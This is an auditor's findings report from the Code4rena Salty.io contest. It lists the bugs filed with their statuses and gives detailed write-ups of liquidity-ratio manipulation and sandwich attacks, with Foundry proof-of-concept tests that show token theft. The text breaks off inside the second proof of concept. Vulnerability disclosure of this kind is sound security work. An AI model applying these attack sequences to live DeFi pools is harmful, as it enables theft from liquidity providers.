# Leaderboard
[Salty.io Leaderboard](https://code4rena.com/audits/2024-01-saltyio#top)
<br>

`Rank 2 / 177`

# Audited Code Repo
### [Code4rena: Salty.io](https://github.com/code-423n4/2024-01-salty)

<br>

# Bugs Filed & Their Status

| # | Bug ID | Name | URL | Adjudged Status |
|--------|--------|------|:------:|-----------------:|
| 1 | [H-01](#h-01)    | User can manipulate reserve ratio and steal funds | [111](https://github.com/code-423n4/2024-01-salty-findings/issues/111) | Rejected |
| 2 | [H-02](#h-02)    | User can call swap() to manipulate reserves and steal funds | [143](https://github.com/code-423n4/2024-01-salty-findings/issues/143) | Rejected |
| 3 | [H-03](#h-03)    | StakingRewards pools are not given their promised share of rewards due to incorrect calculation | [243](https://github.com/code-423n4/2024-01-salty-findings/issues/243) | Accepted as Medium; Selected report. |
| 4 | [H-04](#h-04)    | Partial repayment allows creation of small positions as well as undercollateralized positions | [348](https://github.com/code-423n4/2024-01-salty-findings/issues/348) | Accepted as Medium  |
| 5 | [H-05](#h-05)    | Malicious user can unstake after casting vote to manipulate ballot results | [493](https://github.com/code-423n4/2024-01-salty-findings/issues/493) | Accepted as Medium |
| 6 | [M-01](#m-01)    | changeWallets() can be confirmed immediately after proposalWallets() by manipulating activeTimelock beforehand  | [49](https://github.com/code-423n4/2024-01-salty-findings/issues/49) | Accepted as Medium; Selected report. |
| 7 | [M-02](#m-02)    | `confirmationWallet` can cause `activeTimelock` to be further delayed if approving an already approved proposal  | [50](https://github.com/code-423n4/2024-01-salty-findings/issues/50) | Accepted as QA |
| 8 | [M-03](#m-03)    | setContracts() can be called multiple times allowing owner to set addresses more than once  | [53](https://github.com/code-423n4/2024-01-salty-findings/issues/53) | Accepted as QA |
| 9 | [M-04](#m-04)    | Incorrect calculation to check if difference in price feeds is within the `maximumPriceFeedPercentDifferenceTimes1000` range  | [54](https://github.com/code-423n4/2024-01-salty-findings/issues/54) | Accepted as QA |
|10 | [M-05](#m-05)    | removeLiquidity() can result in reserve1 to go below DUST  | [86](https://github.com/code-423n4/2024-01-salty-findings/issues/86) | Accepted as Medium |
|11 | [M-06](#m-06)    | Incorrect check for DUST threshold in withdraw()  | [85](https://github.com/code-423n4/2024-01-salty-findings/issues/85) | Accepted as QA |
|12 | [M-07](#m-07)    | Incorrect calculation to check remaining ratio after reward in StableConfig.sol  | [118](https://github.com/code-423n4/2024-01-salty-findings/issues/118) | Accepted as Medium; Selected report. |
|13 | [M-08](#m-08)    | Missing DUST check in depositSwapWithdraw() and depositDoubleSwapWithdraw()  | [148](https://github.com/code-423n4/2024-01-salty-findings/issues/148) | Accepted as QA |
|14 | [M-09](#m-09)    | Loss of arbitrage profit due to premature check applied in bisection search | [160](https://github.com/code-423n4/2024-01-salty-findings/issues/160) | Accepted as Medium |
|15 | [M-10](#m-10)    | Incomplete implementation of _verifySignature() allows forged access | [186](https://github.com/code-423n4/2024-01-salty-findings/issues/186) | Accepted as QA |
|16 | [M-11](#m-11)    | Incorrect assumption in PoolMath.sol can cause underflow when zapping is used | [232](https://github.com/code-423n4/2024-01-salty-findings/issues/232) | Accepted as Medium; Selected report. |
|17 | [M-12](#m-12)    | Incorrect maths calculates inverse TWAP | [283](https://github.com/code-423n4/2024-01-salty-findings/issues/283) | Accepted as QA |
|18 | [M-13](#m-13)    | Individual TWAP feeds should not be multiplied or divided to calculate final value in getTwapWBTC() | [289](https://github.com/code-423n4/2024-01-salty-findings/issues/289) | Accepted as QA |
|19 | [M-14](#m-14)    | Liquidators will miss to spot some undercollateralized loans because findLiquidatableUsers() fails to find them | [394](https://github.com/code-423n4/2024-01-salty-findings/issues/394) | Rejected |
|20 | [M-15](#m-15)    | finalizeBallot() can be griefed in cases of proposeSetContractAddress() and proposeWebsiteUpdate() | [444](https://github.com/code-423n4/2024-01-salty-findings/issues/444) | Accepted as Medium |
|21 | [M-16](#m-16)    | token-whitelisting-ballot ordering not respected which can cause loss of opportunity of whitelisting for the token | [532](https://github.com/code-423n4/2024-01-salty-findings/issues/532) | Accepted as QA |
|22 | [M-17](#m-17)    | Ballots not yet past their deadline are incorrectly looped too by tokenWhitelistingBallotWithTheMostVotes() | [556](https://github.com/code-423n4/2024-01-salty-findings/issues/556) | Accepted as Medium |
|23 | [M-18](#m-18)    | Pools' small profits are wiped out by performUpkeep() in step7 | [599](https://github.com/code-423n4/2024-01-salty-findings/issues/599) | Accepted as QA |


<br>

## **HIGH-SEVERITY BUGS**
---

### <a id="h-01"></a>[H-01]
## **User can manipulate reserve ratio and steal funds**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L109
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L115
<br>

## Impact & Issue - 1
There are multiple issues in the implementation of liquidity addition which combine together & enable a malicious user to manipulate reserve ratio and steal funds.<br>
The `_addLiquidity()` function, which is internally called when an external user calls [depositLiquidityAndIncreaseShare()](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/Liquidity.sol#L146), calculates the proportion of tokens on L109 and L115 [inside Pools.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L109-L115):
```js
	// Add the given amount of two tokens to the specified liquidity pool.
	// The maximum amount of tokens is added while having the added amount have the same ratio as the current reserves.
	function _addLiquidity( bytes32 poolID, uint256 maxAmount0, uint256 maxAmount1, uint256 totalLiquidity ) internal returns(uint256 addedAmount0, uint256 addedAmount1, uint256 addedLiquidity)
		{
		PoolReserves storage reserves = _poolReserves[poolID];
		uint256 reserve0 = reserves.reserve0;
		uint256 reserve1 = reserves.reserve1;

		// If either reserve is zero then consider the pool to be empty and that the added liquidity will become the initial token ratio
		if ( ( reserve0 == 0 ) || ( reserve1 == 0 ) )
			{
			// Update the reserves
			reserves.reserve0 += uint128(maxAmount0);
			reserves.reserve1 += uint128(maxAmount1);

			// Default liquidity will be the addition of both maxAmounts in case one of them is much smaller (has smaller decimals)
			return ( maxAmount0, maxAmount1, (maxAmount0 + maxAmount1) );
			}

		// Add liquidity to the pool proportional to the current existing token reserves in the pool.
		// First, try the proportional amount of tokenB for the given maxAmountA
@--->   uint256 proportionalB = ( maxAmount0 * reserve1 ) / reserve0;

		// proportionalB too large for the specified maxAmountB?
		if ( proportionalB > maxAmount1 )
			{
			// Use maxAmountB and a proportional amount for tokenA instead
@--->   	addedAmount0 = ( maxAmount1 * reserve0 ) / reserve1;
			addedAmount1 = maxAmount1;
			}
		
		else
			{
			addedAmount0 = maxAmount0;
			addedAmount1 = proportionalB;
			}

		// Update the reserves
		reserves.reserve0 += uint128(addedAmount0);
		reserves.reserve1 += uint128(addedAmount1);

		// Determine the amount of liquidity that will be given to the user to reflect their share of the total collateralAndLiquidity.
		// Use whichever added amount was larger to maintain better numeric resolution.
		// Rounded down in favor of the protocol.
		if ( addedAmount0 > addedAmount1)
			addedLiquidity = (totalLiquidity * addedAmount0) / reserve0;
		else
			addedLiquidity = (totalLiquidity * addedAmount1) / reserve1;
		}
```

The protocol even has a check inside [addLiquidity()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L146-L147) for DUST threshold:
```js
146:	require( maxAmountA > PoolUtils.DUST, "The amount of tokenA to add is too small" );
147:	require( maxAmountB > PoolUtils.DUST, "The amount of tokenB to add is too small" );
```

However this check is never applied on `proportionalB` inside `_addLiquidity()`. Hence, it can be manipulated to be 0. Done multiple times (or consecutively by multiple accounts), this can skew the reserve ratio. <br>
Consider the following scenario:
- Bob has made an initial liquidity contribution of token1 and token2 in the ratio of `10202 : 101` to the pool. Thus, the ratio of reserves `token1 : token2 = 101 : 1`.
- Alice now wants to add `202 ether : 2 ether` of token1 & token 2. We'll consider two scenarios -
    - **Case1:** _(Normal flow of events)_ :
        - Alice's addition is in correct proportion, so it's added. Amount of Alice's token2 used is `1999803960007841599` in line with the `proportionalB` calculation logic in the piece of code above.
        - Bob wants to exchange `1 ether` of token2 to get some token1 by calling swap. As per the [calculation logic here](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L245-L268) he gets:
        $$
        \begin{equation}
        \begin{split}   amountOut &= reserve1 * amountIn / reserve0 \\
                        &= ( 202000000000000010202 * 1000000000000000000 ) \div ( 1999803960007841700 + 1000000000000000000 ) \\
                        &= 67337733629590904299 \text{ (rounded-down)}
        \end{split}
        \end{equation}
        $$

    - **Case2:** _(Attack flow)_ :
        - Bob front-runs Alice before she can add liquidity. Using his multiple different accounts (this helps him bypass the _cooldown_ wait time), he adds `101` of token1 and `0` of token2. He calls `depositLiquidityAndIncreaseShare()` with `maxAmountA = 101` and `maxAmountB = 101`. The $101$ is passed to get over the [check here](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L146-L147) which mandates that this be greater than the DUST amount of $100$. Any surplus amount he has passed here is returned to Bob after the completion of the transaction due to [this piece of logic](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/Liquidity.sol#L109-L114), hence he won't incur any loss. We'll see in following steps that all of token2 will be returned to him here.
        - His proportion of token2 payable is [calculated as per the formula](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L109) to be:
        $$
        \begin{equation}
        \begin{split}   proportionalB &= ( maxAmount0 * reserve1 ) / reserve0 \\
                        &= ( 101 * 101 ) \div 10202 \\
                        &= 0 \text{ (rounded-down)}
        \end{split}
        \end{equation}
        $$
        - **_Note_** that there is no check anywhere to make sure that the actual `addedAmountX` should be greater than DUST. Hence, $0$ of token2 is accepted. This is one part of the issue.
        - Bob uses multiple accounts to do the above until finally the ratio gets skewed to `200 : 1`. He has to actually do this 99 times to achieve this ratio (shown in the PoC). He could have chosen a lower ratio too.
        - Alice's transaction now gets through and `200 ether` of token1 is in the pool along with some token2. Alice had to deposit lesser amount of token2 due to the skewed ratio.
        - Bob calls `depositSwapWithdraw()` and this time gets:
        $$
        \begin{equation}
        \begin{split}   amountOut &= reserve1 * amountIn / reserve0 \\
                        &= ( 200000000000000020201 * 1000000000000000000 ) \div ( 999950497500123857 + 1000000000000000000 ) \\
                        &= 100002475186257770959 \text{ (rounded-down)}
        \end{split}
        \end{equation}
        $$

Bob stole an extra $100002475186257770959 - 67337733629590904299 = 32664741556666866660$ of token1.

## Proof of Concept - 1
Create a new file `src/staking/tests/BugSandwichLiquidity.t.sol` with the following code and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_bug_sandwich_liquidity`:
```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract BugSandwichLiquidityTest is Deployment
{
    bytes32[] public poolIDs;
    bytes32 public pool1;

    IERC20 public token1;
    IERC20 public token2;

    address public constant alice = address(0x1111);
    address public constant bob = address(0x2222);

	uint256 token1DecimalPrecision;
	uint256 token2DecimalPrecision;

    function setUp() public
    	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

		token1DecimalPrecision = 18;
		token2DecimalPrecision = 18;

    	token1 = new TestERC20("TEST", token1DecimalPrecision);
		token2 = new TestERC20("TEST", token2DecimalPrecision);

        pool1 = PoolUtils._poolID(token1, token2);

        poolIDs = new bytes32[](1);
        poolIDs[0] = pool1;

        // Whitelist the _pools
		vm.startPrank( address(dao) );
        poolsConfig.whitelistPool( pools,   token1, token2);
        vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


        salt.approve(address(collateralAndLiquidity), type(uint256).max);

        // Alice gets some salt and pool lps and approves max to staking
        token1.transfer(alice, 1000 * 10**token1DecimalPrecision);
        token2.transfer(alice, 1000 * 10**token2DecimalPrecision);
        vm.startPrank(alice);
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();

        // Bob gets some salt and pool lps and approves max to staking
        token1.transfer(bob, 1000 * 10**token1DecimalPrecision);
        token2.transfer(bob, 1000 * 10**token2DecimalPrecision);
        vm.startPrank(bob);
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
        token1.approve(address(pools), type(uint256).max);
        token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

        // DAO gets some salt and pool lps and approves max to staking
        token1.transfer(address(dao), 1000 * 10**token1DecimalPrecision);
        token2.transfer(address(dao), 1000 * 10**token2DecimalPrecision);
        vm.startPrank(address(dao));
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();
    	}


	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
		{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return collateralAndLiquidity.totalSharesForPools(_pools2)[0];
		}


	function test_bug_sandwich_liquidity() public {
		// ******************************* SETUP **************************************
		deal(address(token1), bob, 1000000000 ether);
		deal(address(token2), bob, 1000000000 ether);
		deal(address(token1), alice, 1000000000 ether);
		deal(address(token2), alice, 1000000000 ether);

		// create some initial liquidity
		assertEq(collateralAndLiquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
        assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// ratio of 101:1
		uint256 addedAmount1 = 10202;
		uint256 addedAmount2 = 101;

		// Have Bob add liquidity
		vm.prank(bob);
		(,, uint256 addedLiquidity) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, 0 ether, block.timestamp, false );
		assertEq(collateralAndLiquidity.userShareForPool(bob, pool1), addedLiquidity, "Bob's share should have increased" );

		// Check that the contract balance has increased by the amount of the added tokens
		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
        assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		
		uint256 initialToken2BalanceInPool = token2.balanceOf( address(pools));
		// ******************************* SETUP ENDS **************************************

		// save a snapshot of current state
		uint256 snapshot = vm.snapshot();
		
		// ******************************* CASE-1 : NORMAL SCENARIO; NO FRONT-RUN ATTACK **************************************
		// alice adds liquidity
		console.log("\nCase-1:\nOriginal ratio of token1 : token2 is %s : 1", token1.balanceOf( address(pools)) / initialToken2BalanceInPool); // 101:1
		assertEq(collateralAndLiquidity.userShareForPool(alice, pool1), 0, "Alice's initial liquidity share should be zero");
		uint256 alice_addedAmount1 = 202 ether;
		uint256 alice_addedAmount2 = 2 ether; 

		vm.prank(alice);
		(uint256 alice_addedAmountA, uint256 alice_addedAmountB,) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, alice_addedAmount1, alice_addedAmount2, 0 ether, block.timestamp, false );
		console.log("\n\nalice_addedAmountA = %s, alice_addedAmountB = %s\n\n", alice_addedAmountA, alice_addedAmountB);

		// Bob swaps at current exchang rate. inToken = token2, outToken = token1
		vm.prank(bob);
		uint256 amountOut = pools.depositSwapWithdraw( token2, token1, 1 ether, 0, block.timestamp );
		console.log("swapped out token1 amount by Bob for 1 ether of token2 =", amountOut);
		// ******************************* CASE-1 ENDS **************************************
		
		
		// revert to the state of saved snapshot
		vm.revertTo(snapshot);
		// ******************************* CASE-2 : ATTACK SCENARIO; WITH FRONT-RUN ATTACK **************************************
		// 1. Front-running by Bob
		vm.startPrank(bob);
		for (uint256 i; i<99; i++) {
			skip(1 hours); // cooldown  <---------- // @audit-info : This is ONLY for ease of PoC. In an actual attack, Bob would use multiple different accounts to bypass the cooling period.
			collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, 101, 101, 0 ether, block.timestamp, false );
		}
		vm.stopPrank();
		assertEq(token2.balanceOf(address(pools)), initialToken2BalanceInPool, "token2 was actually added"); // @audit : bug: Bob did not spend any token2 amount at all
		console.log("\nCase-2:\nNew ratio of token1 : token2 is %s : 1", token1.balanceOf( address(pools)) / token2.balanceOf( address(pools))); // 200:1
		
		// 2. alice now adds liquidity
		assertEq(collateralAndLiquidity.userShareForPool(alice, pool1), 0, "Alice's initial liquidity share should be zero");
		// she expected a ratio of 202:2 = 101:1
		alice_addedAmount1 = 200 ether;
		alice_addedAmount2 = 2 ether; 

		vm.prank(alice);
		(alice_addedAmountA, alice_addedAmountB,) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, alice_addedAmount1, alice_addedAmount2, 0 ether, block.timestamp, false );
		assertEq(alice_addedAmountA, alice_addedAmount1, "all of Alice's token1 not added");
		assertApproxEqAbs(alice_addedAmountB / 1e17, 10, 1, "Alice's token2 incorrect amount spent"); // @audit : only half of tokens actually spent due to ratio skewed by Bob's front-running

		// Bob swaps at this artificially jacked-up exchanged-rate. inToken = token2, outToken = token1
		vm.prank(bob);
		uint256 amountOutAfterAttack = pools.depositSwapWithdraw( token2, token1, 1 ether, 0, block.timestamp );
		console.log("swapped out token1 amount by Bob for 1 ether of token2 ", amountOutAfterAttack);
		
		console.log("\nExtra token1 amount stolen by Bob in the attack =", amountOutAfterAttack - amountOut);
		assertGt(amountOutAfterAttack - amountOut, 0, "nothing stolen");
		// ******************************* CASE-2 ENDS **************************************
	}
}
```

Output:
```text
[PASS] test_bug_sandwich_liquidity() (gas: 10840362)
Logs:

Case-1:
Original ratio of token1 : token2 is 101 : 1
  swapped out token1 amount by Bob for 1 ether of token2 = 67337733629590904299

Case-2:
New ratio of token1 : token2 is 200 : 1
  swapped out token1 amount by Bob for 1 ether of token2 = 100002475186257770959

Extra token1 amount stolen by Bob in the attack = 32664741556666866660
```

## Impact & Issue - 2
A closely related issue causes similar behaviour when there is difference in the token decimals of the pool. Any user who adds liquidity below a certain amount is able to gain shares without paying any amount of the other token. This too can eventually lead to the ratio getting skewed. The following PoC will show such an example. The decimals for token1 and token2 have been taken as 18 and 2, to amplify the effect of this.<br>
Bob would be adding `1e16 - 1 = 0.009999999999999999 ether` of token1 to trigger this bug. Detailed comments are provided inline, please refer `test_bug_decimals()`.

## Proof of Concept - 2
Create a new file `src/staking/tests/BugLiquidity.t.sol` with the following code and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_bug_decimals`:
```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract BugLiquidityTest is Deployment
{
    bytes32[] public poolIDs;
    bytes32 public pool1;

    IERC20 public token1;
    IERC20 public token2;

    address public constant alice = address(0x1111);
    address public constant bob = address(0x2222);

	uint256 constant token1DecimalPrecision = 18;
	uint256 constant token2DecimalPrecision = 2;

    function setUp() public
    	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

    	token1 = new TestERC20("TEST", token1DecimalPrecision);
		token2 = new TestERC20("TEST", token2DecimalPrecision);

        pool1 = PoolUtils._poolID(token1, token2);

        poolIDs = new bytes32[](1);
        poolIDs[0] = pool1;

        // Whitelist the _pools
		vm.startPrank( address(dao) );
        poolsConfig.whitelistPool( pools,   token1, token2);
        vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


        salt.approve(address(collateralAndLiquidity), type(uint256).max);

        // Alice gets some salt and pool lps and approves max to staking
        token1.transfer(alice, 1000 * 10**token1DecimalPrecision);
        token2.transfer(alice, 1000 * 10**token2DecimalPrecision);
        vm.startPrank(alice);
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();

        // Bob gets some salt and pool lps and approves max to staking
        token1.transfer(bob, 1000 * 10**token1DecimalPrecision);
        token2.transfer(bob, 1000 * 10**token2DecimalPrecision);
        vm.startPrank(bob);
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();

        // DAO gets some salt and pool lps and approves max to staking
        token1.transfer(address(dao), 1000 * 10**token1DecimalPrecision);
        token2.transfer(address(dao), 1000 * 10**token2DecimalPrecision);
        vm.startPrank(address(dao));
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();
    	}


	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
		{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return collateralAndLiquidity.totalSharesForPools(_pools2)[0];
		}


	function test_bug_decimals() public {
		// ******************************* SETUP **************************************
		// create some initial liquidity
		assertEq(collateralAndLiquidity.userShareForPool(alice, pool1), 0, "Alice's initial liquidity share should be zero");
		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
        assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// equal ratio --> 2 tokens of each, adjusted for their respective decimals. One would expect a ratio of 1:1
		uint256 addedAmount1 = 2 * 10**token1DecimalPrecision;
		uint256 addedAmount2 = 2 * 10**token2DecimalPrecision;

		// Have alice add liquidity
		vm.prank(alice);
		(,, uint256 addedLiquidity) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, 0 ether, block.timestamp, false );
		assertEq(collateralAndLiquidity.userShareForPool(alice, pool1), addedLiquidity, "Alice's share should have increased" );

		// Check that the contract balance has increased by the amount of the added tokens
		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
        assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		// ******************************* SETUP ENDS **************************************

		// Bob now adds liquidity
		assertEq(collateralAndLiquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		uint256 bob_addedAmount1 = 1 * 10**(token1DecimalPrecision - token2DecimalPrecision) - 1; // = 1e16 - 1
		uint256 bob_addedAmount2 = 101; // @audit : just to bypass the DUST threshold check, won't actually be spent
		// uint256 bob_initial_token1_balance = token1.balanceOf(bob);
		uint256 bob_initial_token2_balance = token2.balanceOf(bob);

		vm.prank(bob);
		(uint256 bob_addedAmountA, uint256 bob_addedAmountB, uint256 bob_addedLiquidity) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, bob_addedAmount1, bob_addedAmount2, 0 ether, block.timestamp, false );
		assertEq(bob_addedAmountA, bob_addedAmount1, "all of Bob's token1 not added");
		assertEq(bob_addedAmountB, 0, "0 amount was not allowed"); // @audit : no `token2` amount was actually spent by Bob
		assertEq( token2.balanceOf(bob), bob_initial_token2_balance, "Bob's final token2 balance reduced");
		assertEq(collateralAndLiquidity.userShareForPool(bob, pool1), bob_addedLiquidity, "Bob's share should have increased" ); 
		assertEq(bob_addedLiquidity, bob_addedAmount1, "Bob's share increase not equal to token1 added amount" ); 

		// Check that the contract balance has increased by the amount of the added tokens
		assertEq( token1.balanceOf( address(pools)), addedAmount1 + bob_addedAmount1, "Bob's token1 were not deposited into the pool as expected" ); 
        assertEq( token2.balanceOf( address(pools)), addedAmount2, "Bob's token2 got deposited into the pool" ); // @audit : pool's token2 balance remains the same
	}
}
```

## Tools Used
Foundry

## Recommended Mitigation Steps
There are multiple suggestions which need to be made here, some more important than others:
- Before exiting [_addLiquidity()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L131), add the following check:
```js
require( addedAmount0 > PoolUtils.DUST, "The amount of tokenA to add is too small" );
require( addedAmount1 > PoolUtils.DUST, "The amount of tokenB to add is too small" );
```

- The initial liquidity addition in the pool is mandated to be greater than DUST which is just 100 of each token. Consider making/burning an initial deposit like Uniswap does, which can prove substantial enough to thwart any variations of the inflation attack vector. You can consider [other solutions too](https://www.rareskills.io/post/erc4626#:~:text=ERC4626%20inflation%20attack).

- Normalize & sync the decimals of the token pair in the pool. You could choose to have 50 decimal precision as a common figure, or upscale the lower token decimal to the higher one. Further code changes may need to be made to accomodate this.

- In order to guarantee the contract does not bear a loss, incoming assets should be rounded up, while outgoing assets should be rounded down. The `proportionalB` amount is incoming, yet rounded-down. The protocol should consider if rounding it up makes more sense. One should be careful here because this `proportionalB` value also contributes to the number of shares given to the liquidity provider (outgoing asset). It might be safer to have two different variables here - one rounded up to calculate correct proportion, and the other rounded down while allocating shares.

There are a few other observations which should be looked into and can be implemented in line with other popular implementations:
- The protocol currently calculates the liquidity or the number of shares by [adding the tokenAmounts](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L103-L104) in the initial deposit. Calculating it as `Sqaure Root K` may be a better approach as mentioned [here](https://www.rareskills.io/post/uniswap-v2-mint-and-burn#:~:text=Why%20Uniswap%20Calculates%20Liquidity%20as%20Square%20Root%20K).
- On [L129](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L129), the protocol gives the reason to choose the larger amount for calculating liquidity. Protocols like Uniswap prefer choosing the lower amount and [may be a better approach](https://www.rareskills.io/post/uniswap-v2-mint-and-burn#:~:text=If%20we%20took%20the%20maximum%20of%20the%20two%20ratios), but should be considered further in the protocol's context. Note that even if the protocol wants to pick the max value, the [current logic](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L131) does not seem entirely safe as it compares absolute values. Comparing the amountX to reserveX ratios seems to be better:
```diff
		// Determine the amount of liquidity that will be given to the user to reflect their share of the total collateralAndLiquidity.
		// Use whichever added amount was larger to maintain better numeric resolution.
		// Rounded down in favor of the protocol.
-		if ( addedAmount0 > addedAmount1)
+		if ( addedAmount0 * reserve1 > addedAmount1 * reserve0)  // comparing that (addedAmount0/reserve0) > (addedAmount1/reserve1) i.e. the contribution ratio is greater or not
			addedLiquidity = (totalLiquidity * addedAmount0) / reserve0;
		else
			addedLiquidity = (totalLiquidity * addedAmount1) / reserve1;
		}
```

---

### <a id="h-02"></a>[H-02]
## **User can call swap() to manipulate reserves and steal funds**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L140
<br>

## Impact
Consider the following scenario _(see PoC for example code & exact numbers)_:
- Bob has made an initial liquidity contribution of token1 and token2 in the ratio of `1 ether : 1 ether` to the pool. Thus, the ratio of reserves `token1 : token2 = 1 : 1`.
- Alice now wants to add `10 ether : 10 ether` of token1 & token 2. Let's consider two scenarios -
    - **Case1:** _(Normal flow of events)_ :
        - Alice's contribution is added. 
        - Bob wants to exchange `1 ether` of token2 to get some token1 by calling swap. As per the [calculation logic here](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L245-L268) he gets `0.916666666666666666 ether`.

    - **Case2:** _(Attack flow)_ : (Sandwich via swap) -
        - Bob front-runs Alice before she can add liquidity. He calls `pools.depositSwapWithdraw( token1, token2, 1 ether, 0, block.timestamp )`. This causes the reserve ratios to change before Alice's deposit. The ratio now becomes `2 ether : 0.5 ether` or `4 : 1`.
        - Alice's liquidity of `10 ether` of each token gets added.
        - Bob back-runs Alice with another swap. He calls `pools.depositSwapWithdraw( token2, token1, 1 ether, 0, block.timestamp )` and receives more token1 than he did in Case1, amounting to `3 ether`.
        
Bob stole an extra $3 - 0.916666666666666666 = 2.083333333333333334 \text{ ether}$ of token1.

## Proof of Concept
Create a new file `src/staking/tests/BugSwapManipulation.t.sol` with the following code and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_sandwich_with_swap`.<br>
Bob, who is the first liquidity provider, launches a sandwich attack on Alice's attempt to add liquidity and as a result, profits unfairly. Detailed inline comments provided inside the test case:
```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract ExperimentsSandwichLiquidityTest is Deployment
{
    bytes32[] public poolIDs;
    bytes32 public pool1;

    IERC20 public token1;
    IERC20 public token2;

    address public constant alice = address(0x1111);
    address public constant bob = address(0x2222);

	uint256 token1DecimalPrecision;
	uint256 token2DecimalPrecision;

    function setUp() public
    	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

    	token1 = new TestERC20("TEST", 18);
		token2 = new TestERC20("TEST", 18);

        pool1 = PoolUtils._poolID(token1, token2);

        poolIDs = new bytes32[](1);
        poolIDs[0] = pool1;

        // Whitelist the _pools
		vm.startPrank( address(dao) );
        poolsConfig.whitelistPool( pools,   token1, token2);
        vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


